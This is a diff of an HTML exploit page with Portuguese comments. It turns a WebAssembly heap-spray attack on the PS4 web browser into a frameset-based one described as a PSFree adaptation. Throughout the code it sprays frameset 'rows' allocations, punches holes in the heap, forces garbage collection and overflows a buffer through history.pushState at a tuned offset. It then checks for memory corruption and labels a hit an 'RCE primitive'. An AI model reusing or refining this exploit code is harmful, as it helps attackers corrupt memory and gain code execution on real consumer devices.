@@ -1,35 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 WebAssembly Memory Clash</title>
+    <title>PS4 Frameset Overflow (PSFree Style)</title>
     <style>
-        body { background-color: #200; color: #f0f; font-family: monospace; padding: 20px; }
-        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #f0f; background: #000; color: #fff; cursor: pointer; }
-        #log { margin-top: 20px; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; background: #111;}
-        .win { background-color: #f0f; color: #000; font-weight: bold; font-size: 1.4em; border: 2px solid white; padding: 15px;}
+        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
+        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
+        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.4em; border: 2px solid white; padding: 15px;}
     </style>
 </head>
 <body>
 
-    <h1>Ataque WebAssembly (Wasm Clash)</h1>
-    <p>Tentando colidir a String do pushState com memória WebAssembly (mmap vs mmap).</p>
+    <h1>Ataque Frameset (Adaptação PSFree)</h1>
+    <p>Usando &lt;frameset&gt; para alocar no fastMalloc e sofrer o overflow.</p>
 
-    <button onclick="startWasmAttack()">INICIAR PROTOCOLO WASM</button>
+    <button onclick="startFramesetAttack()">INICIAR FRAMESET ATTACK</button>
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        // O offset alinhado que descobrimos
-        const ALIGNED_OFFSET = 709520;
-        const OVERFLOW_AMT = 1024 * 1024 * 2; // 2MB de overflow agressivo
+        const BASE_OFFSET = 709522;
+        const OVERFLOW_AMT = 1024 * 64; // 64KB de excesso
 
-        // Configuração do Wasm
-        // 1 Page = 64KB. 
-        // 256 Pages = 16MB.
-        const WASM_PAGES = 256; 
-        const SPRAY_COUNT = 60;
+        // Tamanho do objeto Length interno do WebKit = 8 bytes (conforme psfree.mjs)
+        // Queremos encher um balde de 1MB.
+        // 1MB / 8 bytes = 131072 elementos.
+        // A string "rows" precisa gerar esse número de elementos.
+        // Cada vírgula gera um elemento.
+        const TARGET_ELEMENTS = (1024 * 1024) / 8; 
+        const ROWS_STRING = ",".repeat(TARGET_ELEMENTS);
 
+        const SPRAY_COUNT = 100;
         var victims = [];
-        var views = [];
 
         function log(msg, type) {
             const el = document.getElementById('log');
@@ -38,40 +39,23 @@
             el.scrollTop = el.scrollHeight;
         }
 
-        async function startWasmAttack() {
-            if (typeof WebAssembly === 'undefined') {
-                log("Erro: WebAssembly não suportado neste navegador.");
-                return;
-            }
+        async function startFramesetAttack() {
+            log(`1. Alocando ${SPRAY_COUNT} Framesets (fastMalloc)...`);
 
-            log(`1. Alocando ${SPRAY_COUNT} Memórias Wasm de 16MB...`);
-
-            try {
-                // FASE 1: SPRAY WASM
-                for(let i=0; i<SPRAY_COUNT; i++) {
-                    // Cria memória Wasm
-                    let mem = new WebAssembly.Memory({initial: WASM_PAGES, maximum: WASM_PAGES});
-                    
-                    // Cria uma "view" (janela) para ler essa memória
-                    let view = new Uint32Array(mem.buffer);
-                    
-                    // Marca o início com 0xCCCCCCCC
-                    view[0] = 0xCCCCCCCC;
-                    view[1024] = 0xCCCCCCCC;
-                    
-                    victims.push(mem);
-                    views.push(view);
-                }
-            } catch(e) {
-                log("Erro na alocação Wasm (OOM): " + e.message);
+            // FASE 1: SPRAY DE FRAMESET
+            // Isso aloca memória no mesmo heap que o pushState usa!
+            for(let i=0; i<SPRAY_COUNT; i++) {
+                let fset = document.createElement('frameset');
+                // O atributo rows aloca um array de Length[] no heap
+                fset.rows = ROWS_STRING; 
+                victims.push(fset);
             }
 
             // FASE 2: BURACOS
-            log("2. Criando buracos no Heap Wasm...");
-            // Apaga referências intercaladas
-            for(let i=0; i<victims.length; i+=2) {
+            log("2. Criando buracos...");
+            for(let i=0; i<SPRAY_COUNT; i+=2) {
+                victims[i].rows = ""; // Libera a memória interna
                 victims[i] = null;
-                views[i] = null;
             }
 
             await forceGC();
@@ -81,13 +65,13 @@
 
             setTimeout(() => {
                 try {
-                    let buffer = "A".repeat(ALIGNED_OFFSET);
+                    let buffer = "A".repeat(BASE_OFFSET);
                     buffer += "\x01".repeat(OVERFLOW_AMT);
                     
-                    history.pushState({}, "wasm_pwn", "/" + buffer);
+                    history.pushState({}, "frameset_pwn", "/" + buffer);
 
-                    log("4. Verificando corrupção nas memórias Wasm...");
-                    checkWasmCorruption();
+                    log("4. Verificando corrupção nos Framesets...");
+                    checkFramesets();
 
                 } catch (e) {
                     log("Erro no Exploit: " + e.message);
@@ -95,37 +79,44 @@
             }, 500);
         }
 
-        function checkWasmCorruption() {
+        function checkFramesets() {
             let success = false;
 
-            // Checa as views que sobraram
-            for(let i=1; i<views.length; i+=2) {
-                let view = views[i];
-                if(!view) continue;
+            // Checa os framesets que sobraram
+            for(let i=1; i<victims.length; i+=2) {
+                let fset = victims[i];
+                if(!fset) continue;
 
-                // Wasm Memory é protegida, mas se o overflow mmap cair em cima,
-                // vamos ver os dados mudarem.
+                // Lemos de volta a propriedade rows
+                // O WebKit reconstrói a string baseada na memória.
+                // Se a memória foi corrompida por 0x01, os valores vão mudar.
+                let val = fset.rows;
                 
-                // Procuramos pelo byte 0x01 repetido.
-                // Como lemos como Uint32, 0x01010101 = 16843009
-                if (view[0] === 16843009 || view[0] === 0x01010101) {
-                    log(`!!! JACKPOT !!! Wasm ${i} foi sobrescrito!`, 'win');
-                    alert("WASM MEMORY CORRUPTED!");
+                // O valor original é "1*,1*,1*..." (o padrão para vírgulas vazias é 1*)
+                // Se tivermos corrupção, veremos números estranhos ou formatação quebrada.
+                
+                // Checagem simples: O tamanho da string retornada mudou?
+                // Ou se contém caracteres estranhos?
+                if (val.length !== ROWS_STRING.length && Math.abs(val.length - ROWS_STRING.length) > 100) {
+                    log(`!!! SUCESSO !!! Frameset ${i} corrompido!`, 'win');
+                    log(`Tam Original: ${ROWS_STRING.length} | Novo: ${val.length}`);
+                    alert("FRAMESET CORRUPTED!");
                     success = true;
                     break;
                 }
                 
-                // Se mudou de 0xCCCCCCCC para qualquer outra coisa
-                if (view[0] !== 0xCCCCCCCC) {
-                     log(`!!! ANOMALIA !!! Wasm ${i} alterado para 0x${view[0].toString(16)}`, 'win');
+                // Checagem profunda (amostragem)
+                if (val.indexOf("16843009") !== -1 || val.indexOf("0%") !== -1) { 
+                     // 16843009 é 0x01010101 em decimal
+                     log(`!!! JACKPOT !!! Dados 0x01 encontrados no Frameset ${i}`, 'win');
+                     alert("RCE PRIMITIVE: FRAMESET!");
                      success = true;
                      break;
                 }
             }
 
             if(!success) {
-                log("Nenhuma memória Wasm atingida.");
-                log("O isolamento mmap entre String e Wasm parece ativo.");
+                log("Nenhum frameset atingido. Tente ajustar o TARGET_ELEMENTS.");
             }
         }
 
